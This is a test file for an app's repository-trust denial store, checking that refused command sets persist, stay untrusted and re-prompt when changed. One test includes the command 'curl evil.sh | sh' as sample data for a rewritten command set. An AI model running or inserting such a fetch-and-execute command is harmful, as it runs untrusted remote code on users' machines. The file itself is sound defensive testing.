import { afterAll, beforeEach, describe, expect, test } from 'bun:test'
import { mkdtempSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { commandSetHash, approveRepo, isRepoTrusted } from '../repo-trust'
import {
  denyRepo,
  isRepoDenied,
  readDenialStore,
  registerRepoTrustDenialIpc,
  undenyRepo,
  writeDenialStore,
  type DenialStore,
} from './repo-trust-denials'

// Never the real ~/.config/TerMinal.
const dir = mkdtempSync(join(tmpdir(), 'gt-repo-trust-denials-'))
const file = join(dir, 'repo-trust-denials.json')
afterAll(() => rmSync(dir, { recursive: true, force: true }))
beforeEach(() => rmSync(file, { force: true }))

const HASH = commandSetHash(['npm run widget'])

describe('isRepoDenied', () => {
  test('an unknown repo is not denied — absence of refusal is not refusal', () => {
    expect(isRepoDenied({}, '/tmp/repo', HASH)).toBe(false)
  })

  test('a denied repo stays denied, so the badge does not re-prompt on re-attach', () => {
    const store = denyRepo({}, '/tmp/repo', HASH)
    expect(isRepoDenied(store, '/tmp/repo', HASH)).toBe(true)
  })

  test('denial is keyed on the command set — a repo that rewrites it prompts again', () => {
    const store = denyRepo({}, '/tmp/repo', HASH)
    const changed = commandSetHash(['npm run widget', 'curl evil.sh | sh'])
    expect(isRepoDenied(store, '/tmp/repo', changed)).toBe(false)
  })

  test('denial does not leak to another repo root, and an empty root is never denied', () => {
    const store = denyRepo({}, '/tmp/repo', HASH)
    expect(isRepoDenied(store, '/tmp/other', HASH)).toBe(false)
    expect(isRepoDenied(store, '', HASH)).toBe(false)
    expect(isRepoDenied(store, '/tmp/repo', '')).toBe(false)
  })

  test('undeny clears it so the user can change their mind', () => {
    const store = undenyRepo(denyRepo({}, '/tmp/repo', HASH), '/tmp/repo')
    expect(isRepoDenied(store, '/tmp/repo', HASH)).toBe(false)
  })

  test('denying grants nothing — a denied repo is still untrusted', () => {
    const denied = denyRepo({}, '/tmp/repo', HASH)
    expect(isRepoDenied(denied, '/tmp/repo', HASH)).toBe(true)
    expect(isRepoTrusted({}, '/tmp/repo', HASH)).toBe(false)
    // And approving is what grants, independent of the denial store.
    expect(isRepoTrusted(approveRepo({}, '/tmp/repo', HASH), '/tmp/repo', HASH)).toBe(true)
  })
})

describe('denial store IO', () => {
  test('round-trips through disk — refusal survives a restart', () => {
    writeDenialStore(denyRepo({}, '/tmp/repo', 'abc123', 1700), file)
    expect(readDenialStore(file)).toEqual({ '/tmp/repo': { hash: 'abc123', deniedAt: 1700 } })
  })

  test('a missing or corrupt store is empty — it fails to "not denied", never to trusted', () => {
    expect(readDenialStore(join(dir, 'nope.json'))).toEqual({})
    writeFileSync(file, '{ not json')
    expect(readDenialStore(file)).toEqual({})
    writeFileSync(file, '["array"]')
    expect(readDenialStore(file)).toEqual({})
  })

  test('entries without a string hash are dropped', () => {
    writeFileSync(file, JSON.stringify({ '/a': { deniedAt: 1 }, '/b': { hash: 'h' } }))
    const store: DenialStore = readDenialStore(file)
    expect(Object.keys(store)).toEqual(['/b'])
  })
})

describe('registerRepoTrustDenialIpc', () => {
  // Minimal IpcMain stand-in: capture the handlers and invoke them directly.
  function harness() {
    const handlers = new Map<string, (e: unknown, ...args: never[]) => unknown>()
    const ipcMain = {
      handle: (ch: string, fn: (e: unknown, ...args: never[]) => unknown) => handlers.set(ch, fn),
    }
    registerRepoTrustDenialIpc(ipcMain as never, file)
    const call = (ch: string, ...args: unknown[]) =>
      handlers.get(ch)!(null, ...(args as never[])) as unknown
    return { handlers, call }
  }

  test('registers exactly the three denial channels', () => {
    expect([...harness().handlers.keys()].sort()).toEqual([
      'repoTrust:denied',
      'repoTrust:deny',
      'repoTrust:undeny',
    ])
  })

  test('deny persists across a fresh read, and undeny clears it', () => {
    const { call } = harness()
    expect(call('repoTrust:denied', '/tmp/repo', HASH)).toBe(false)
    expect(call('repoTrust:deny', '/tmp/repo', HASH)).toBe(true)
    expect(call('repoTrust:denied', '/tmp/repo', HASH)).toBe(true)
    // A second registration reads the same file — i.e. it survived the process.
    expect(harness().call('repoTrust:denied', '/tmp/repo', HASH)).toBe(true)
    expect(call('repoTrust:undeny', '/tmp/repo')).toBe(true)
    expect(call('repoTrust:denied', '/tmp/repo', HASH)).toBe(false)
  })

  test('a missing root or hash is rejected rather than written', () => {
    const { call } = harness()
    expect(call('repoTrust:deny', '', HASH)).toBe(false)
    expect(call('repoTrust:deny', '/tmp/repo', '')).toBe(false)
    expect(call('repoTrust:undeny', '')).toBe(false)
    expect(readDenialStore(file)).toEqual({})
  })
})
